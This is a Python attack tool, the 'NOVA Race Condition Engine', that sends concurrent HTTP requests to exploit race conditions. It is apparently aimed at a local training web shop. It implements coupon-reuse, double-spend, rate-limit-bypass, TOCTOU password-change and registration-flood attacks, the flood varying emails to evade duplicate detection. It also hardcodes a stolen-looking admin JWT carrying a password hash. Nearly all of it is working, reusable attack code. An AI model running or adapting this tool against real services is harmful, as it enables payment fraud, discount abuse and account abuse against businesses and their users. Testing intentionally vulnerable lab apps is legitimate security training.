#!/usr/bin/env python3
"""
NOVA RACE CONDITION ENGINE v1.0
Concurrent request engine for TOCTOU detection,
limit bypass, coupon reuse, and atomicity violations.
Uses threading for true parallel attack execution.
"""

import json
import time
import requests
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple


class NovaRaceEngine:
    """
    High-speed race condition exploitation engine.
    
    Attack Vectors:
    - Coupon/ discount code reuse
    - Rate limit bypass
    - Parallel transaction submission
    - TOCTOU (Time-of-check to time-of-use)
    - Concurrent session creation
    - Double-spend attacks
    """

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.results = []
        self.lock = threading.Lock()
        
        # Default headers
        self.base_headers = {
            "User-Agent": "Nova/4.0 (Race Engine)",
            "Accept": "application/json",
            "Content-Type": "application/json",
        }

    # ---------- CORE RACE EXECUTOR ----------
    def _send_request(self, session_id: int, endpoint: str, method: str = "GET",
                      headers: Dict = None, data: Dict = None, params: Dict = None,
                      token: str = None) -> Dict:
        """Single request unit for parallel execution."""
        session = requests.Session()
        req_headers = self.base_headers.copy()
        if headers:
            req_headers.update(headers)
        if token:
            req_headers["Authorization"] = f"Bearer {token}"

        url = f"{self.base_url}{endpoint}"
        start_time = time.time()

        try:
            if method.upper() == "GET":
                resp = session.get(url, headers=req_headers, params=params, timeout=15)
            elif method.upper() == "POST":
                resp = session.post(url, headers=req_headers, json=data, timeout=15)
            elif method.upper() == "PUT":
                resp = session.put(url, headers=req_headers, json=data, timeout=15)
            elif method.upper() == "DELETE":
                resp = session.delete(url, headers=req_headers, timeout=15)
            else:
                resp = session.request(method, url, headers=req_headers, json=data, timeout=15)

            elapsed = round((time.time() - start_time) * 1000, 2)  # ms
            
            return {
                "session_id": session_id,
                "endpoint": endpoint,
                "method": method,
                "status_code": resp.status_code,
                "response_length": len(resp.text),
                "response_time_ms": elapsed,
                "response_body": resp.text[:500],
                "headers": dict(resp.headers),
                "success": resp.status_code in [200, 201, 202, 302],
                "error": None,
            }
        except Exception as e:
            return {
                "session_id": session_id,
                "endpoint": endpoint,
                "method": method,
                "status_code": 0,
                "response_time_ms": round((time.time() - start_time) * 1000, 2),
                "response_body": "",
                "success": False,
                "error": str(e)[:200],
            }

    def execute_parallel(self, requests_config: List[Dict], thread_count: int = 10,
                         delay_between: float = 0) -> List[Dict]:
        """
        Execute multiple requests in true parallel threads.
        
        Args:
            requests_config: List of request configurations
            thread_count: Number of concurrent threads
            delay_between: Artificial delay between thread launches (0 = simultaneous)
        """
        results = []
        print(f"\n  ⚡ Parallel Execution: {len(requests_config)} requests, {thread_count} threads")
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            for i, config in enumerate(requests_config):
                future = executor.submit(
                    self._send_request,
                    session_id=i,
                    endpoint=config.get("endpoint", "/"),
                    method=config.get("method", "GET"),
                    headers=config.get("headers"),
                    data=config.get("data"),
                    params=config.get("params"),
                    token=config.get("token"),
                )
                futures.append(future)
                
                if delay_between > 0:
                    time.sleep(delay_between)

            for future in as_completed(futures):
                result = future.result()
                with self.lock:
                    results.append(result)
                    self.results.append(result)

        # Sort by response time to identify race winners
        results.sort(key=lambda r: r.get("response_time_ms", 0))
        return results

    # ---------- ATTACK: COUPON / DISCOUNT REUSE ----------
    def attack_coupon_reuse(self, coupon_code: str, apply_endpoint: str,
                            item_data: Dict, thread_count: int = 20) -> Dict:
        """
        Attempt to apply the same coupon multiple times simultaneously.
        Classic race condition: check if coupon is used → apply → mark as used.
        """
        print(f"""
╔══════════════════════════════════════════╗
║  🎫 COUPON REUSE ATTACK                ║
║  Code: {coupon_code:<30} ║
║  Threads: {thread_count:<30} ║
╚══════════════════════════════════════════╝""")

        configs = []
        for _ in range(thread_count):
            configs.append({
                "endpoint": apply_endpoint,
                "method": "POST",
                "data": {**item_data, "coupon": coupon_code},
            })

        results = self.execute_parallel(configs, thread_count=thread_count)
        
        # Analyze: how many succeeded?
        successes = [r for r in results if r["success"]]
        unique_responses = len(set(r["response_body"][:100] for r in successes))
        
        finding = {
            "attack_type": "coupon_reuse",
            "coupon_code": coupon_code,
            "total_attempts": len(results),
            "successful": len(successes),
            "success_rate": round(len(successes) / max(len(results), 1) * 100, 2),
            "unique_responses": unique_responses,
            "vulnerable": len(successes) > 1 and unique_responses > 1,
            "evidence": [r for r in successes[:3]],
        }

        if finding["vulnerable"]:
            print(f"  🔥 VULNERABLE! {len(successes)}/{len(results)} succeeded. Coupon reused!")
        else:
            print(f"  ✅ Protected: Only {len(successes)} succeeded")

        return finding

    # ---------- ATTACK: RATE LIMIT BYPASS ----------
    def attack_rate_limit_bypass(self, endpoint: str, method: str = "GET",
                                  params: Dict = None, thread_count: int = 50,
                                  burst_count: int = 100) -> Dict:
        """
        Burst requests to bypass rate limiting.
        If rate limit is 10/sec, send 50 in parallel to slip through.
        """
        print(f"""
╔══════════════════════════════════════════╗
║  🚀 RATE LIMIT BYPASS                  ║
║  Target: {endpoint:<30} ║
║  Burst: {burst_count} requests in parallel      ║
╚══════════════════════════════════════════╝""")

        configs = []
        for i in range(burst_count):
            configs.append({
                "endpoint": endpoint,
                "method": method,
                "params": params,
            })

        results = self.execute_parallel(configs, thread_count=thread_count)
        
        # Rate limit indicators
        status_429 = [r for r in results if r["status_code"] == 429]
        status_200 = [r for r in results if r["status_code"] == 200]
        
        finding = {
            "attack_type": "rate_limit_bypass",
            "endpoint": endpoint,
            "total_requests": len(results),
            "successful": len(status_200),
            "rate_limited": len(status_429),
            "errors": len([r for r in results if r["status_code"] >= 500]),
            "bypass_ratio": round(len(status_200) / max(len(results), 1) * 100, 2),
            "vulnerable": len(status_200) > len(status_429),
        }

        if finding["vulnerable"]:
            print(f"  🔥 RATE LIMIT BYPASSED! {len(status_200)}/{len(results)} passed ({finding['bypass_ratio']}%)")
        else:
            print(f"  ✅ Rate limit enforced: {len(status_429)} blocked")

        return finding

    # ---------- ATTACK: DOUBLE-SPEND / TRANSACTION DUPLICATION ----------
    def attack_double_spend(self, transaction_endpoint: str, transaction_data: Dict,
                            auth_token: str = None, thread_count: int = 5) -> Dict:
        """
        Submit the same transaction multiple times simultaneously.
        Tests for idempotency violations in financial operations.
        """
        print(f"""
╔══════════════════════════════════════════╗
║  💰 DOUBLE-SPEND ATTACK                ║
║  Target: {transaction_endpoint:<30} ║
║  Threads: {thread_count}                            ║
╚══════════════════════════════════════════╝""")

        configs = []
        for _ in range(thread_count):
            configs.append({
                "endpoint": transaction_endpoint,
                "method": "POST",
                "data": transaction_data,
                "token": auth_token,
            })

        results = self.execute_parallel(configs, thread_count=thread_count)
        
        successes = [r for r in results if r["success"]]
        # If multiple succeed with different response bodies, likely duplicated
        unique_bodies = set(r["response_body"][:200] for r in successes)
        
        finding = {
            "attack_type": "double_spend",
            "endpoint": transaction_endpoint,
            "total_attempts": len(results),
            "successful": len(successes),
            "unique_responses": len(unique_bodies),
            "vulnerable": len(successes) > 1 and len(unique_bodies) > 1,
            "evidence": [r for r in successes[:3]],
        }

        if finding["vulnerable"]:
            print(f"  🔥 DOUBLE-SPEND POSSIBLE! {len(successes)} transactions succeeded!")
        else:
            print(f"  ✅ Protected: Only {len(successes)} unique transaction(s)")

        return finding

    # ---------- ATTACK: TOCTOU (FILE/ RESOURCE RACE) ----------
    def attack_toctou(self, check_endpoint: str, action_endpoint: str,
                       action_data: Dict, auth_token: str = None,
                       thread_count: int = 10) -> Dict:
        """
        Time-of-check to Time-of-use attack.
        Check passes → modify resource → action executes on modified resource.
        """
        print(f"""
╔══════════════════════════════════════════╗
║  ⏱️  TOCTOU ATTACK                     ║
║  Check: {check_endpoint:<30} ║
║  Action: {action_endpoint:<30} ║
╚══════════════════════════════════════════╝""")

        # Phase 1: Verify check passes
        check_result = self._send_request(0, check_endpoint, "GET", token=auth_token)
        if not check_result["success"]:
            print(f"  ❌ Pre-check failed: {check_result['status_code']}")
            return {"attack_type": "toctou", "vulnerable": False, "error": "Pre-check failed"}

        print(f"  ✅ Pre-check passed: {check_result['status_code']}")

        # Phase 2: Race — send action requests while check might be stale
        configs = []
        for _ in range(thread_count):
            configs.append({
                "endpoint": action_endpoint,
                "method": "POST",
                "data": action_data,
                "token": auth_token,
            })

        results = self.execute_parallel(configs, thread_count=thread_count)
        successes = [r for r in results if r["success"]]

        finding = {
            "attack_type": "toctou",
            "check_endpoint": check_endpoint,
            "action_endpoint": action_endpoint,
            "total_attempts": len(results),
            "successful": len(successes),
            "vulnerable": len(successes) > 1,
            "evidence": [r for r in successes[:3]],
        }

        if finding["vulnerable"]:
            print(f"  🔥 TOCTOU VULNERABLE! {len(successes)} actions after single check!")
        else:
            print(f"  ✅ Protected: Only {len(successes)} action(s) allowed")

        return finding

    # ---------- ATTACK: CONCURRENT SESSION CREATION ----------
    def attack_session_flood(self, register_endpoint: str, user_data_template: Dict,
                              thread_count: int = 20) -> Dict:
        """
        Create many sessions/users simultaneously.
        Tests for duplicate user creation, session fixation opportunities.
        """
        print(f"""
╔══════════════════════════════════════════╗
║  👥 SESSION FLOOD ATTACK               ║
║  Target: {register_endpoint:<30} ║
╚══════════════════════════════════════════╝""")

        configs = []
        for i in range(thread_count):
            # Slightly vary data to avoid exact duplicate detection
            varied_data = user_data_template.copy()
            if "email" in varied_data:
                base_email = varied_data["email"].split("@")
                varied_data["email"] = f"{base_email[0]}+{i}@{base_email[1]}"
            if "username" in varied_data:
                varied_data["username"] = f"{varied_data['username']}_{i}"
            
            configs.append({
                "endpoint": register_endpoint,
                "method": "POST",
                "data": varied_data,
            })

        results = self.execute_parallel(configs, thread_count=thread_count)
        successes = [r for r in results if r["success"]]
        
        finding = {
            "attack_type": "session_flood",
            "endpoint": register_endpoint,
            "total_attempts": len(results),
            "successful": len(successes),
            "vulnerable": len(successes) == len(results),  # All should succeed or all should be rate-limited
            "evidence": [r for r in successes[:3]],
        }

        if finding["vulnerable"]:
            print(f"  ⚠️  All {len(successes)} sessions created — potential for abuse")
        else:
            print(f"  ✅ Protected: {len(successes)}/{len(results)} created (some blocked)")

        return finding

    # ---------- FULL RACE SUITE ----------
    def run_full_race_suite(self, auth_token: str = None) -> Dict:
        """Execute all race condition attack vectors."""
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║   🏎️  NOVA RACE CONDITION ENGINE v1.0     ║
║   Parallel Exploitation Framework          ║
║                                              ║
╚══════════════════════════════════════════════╝
        """)

        findings = {
            "timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "attacks": [],
            "vulnerable_count": 0,
        }

        # Attack 1: Coupon Reuse
        coupon_result = self.attack_coupon_reuse(
            coupon_code="WELCOME10",
            apply_endpoint="/rest/basket/1/coupon",
            item_data={"basketId": 1},
        )
        findings["attacks"].append(coupon_result)
        if coupon_result.get("vulnerable"): findings["vulnerable_count"] += 1

        time.sleep(0.5)

        # Attack 2: Rate Limit Bypass
        rate_result = self.attack_rate_limit_bypass(
            endpoint="/rest/products/search",
            params={"q": "test"},
            burst_count=50,
        )
        findings["attacks"].append(rate_result)
        if rate_result.get("vulnerable"): findings["vulnerable_count"] += 1

        time.sleep(0.5)

        # Attack 3: TOCTOU on password change
        toctou_result = self.attack_toctou(
            check_endpoint="/rest/user/whoami",
            action_endpoint="/rest/user/change-password",
            action_data={"current": "oldpass", "new": "newpass123", "repeat": "newpass123"},
            auth_token=auth_token,
        )
        findings["attacks"].append(toctou_result)
        if toctou_result.get("vulnerable"): findings["vulnerable_count"] += 1

        time.sleep(0.5)

        # Attack 4: Session Flood
        flood_result = self.attack_session_flood(
            register_endpoint="/api/Users",
            user_data_template={
                "email": "nova_test@juice-sh.op",
                "password": "NovaTest123!",
                "securityQuestion": "What is your favorite color?",
                "securityAnswer": "blue",
            },
        )
        findings["attacks"].append(flood_result)
        if flood_result.get("vulnerable"): findings["vulnerable_count"] += 1

        # Save report
        with open("nova_race_report.json", "w") as f:
            json.dump(findings, f, indent=2, default=str)

        print(f"""
╔══════════════════════════════════════════╗
║     RACE ENGINE SUMMARY                 ║
╠══════════════════════════════════════════╣
║  Attacks Executed:    {len(findings['attacks']):>2}                ║
║  Vulnerabilities:     {findings['vulnerable_count']:>2}                ║
╚══════════════════════════════════════════╝
        """)

        return findings


if __name__ == "__main__":
    engine = NovaRaceEngine(base_url="http://localhost:3000")
    # Use token from previous missions
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE3NzgwNzI5MDMsImV4cCI6MTc3ODA3NjUwM30.YqYw0gV2c-jHLlVe2m2hPZdOe8FoIGWXaG3OL3B6o7lYsX3A4FqYs3Y3dQzP3Xh1Y7YtY7YtY7YtY7YtY7Y"
    report = engine.run_full_race_suite(auth_token=token)
